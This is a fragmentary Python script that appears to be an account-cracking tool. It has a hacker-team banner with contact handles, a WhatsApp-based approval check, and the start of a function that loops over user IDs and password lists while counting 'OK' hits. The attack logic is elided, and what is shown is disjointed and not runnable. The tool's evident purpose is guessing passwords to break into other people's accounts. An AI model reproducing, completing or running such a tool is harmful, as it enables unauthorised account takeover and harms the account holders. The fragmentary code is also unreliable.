#LADIN(NAHID)(RJ. LADIN)
#WhatsApp : 01893969113
#Github : noonNAHID
from os import path
...
|    \    \ | /   /  \\  \(:  (  )  :)/\  |\ |:       :) 
 \___|\____\)(___/    \___)\__|  |__/(__\_|_)(________/  
    ...
    │ [✓] GITHUB   : LADIN-404                │
    │ [✓] WHATSAPP : +966566020917         │
    │ [✓] VERSION  : 1.9                    │
    │ [✓] TEAM : India Cyber Security Force            │
    └───────────────────────────────────────┘""")                                           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801893969113?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [LADIN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
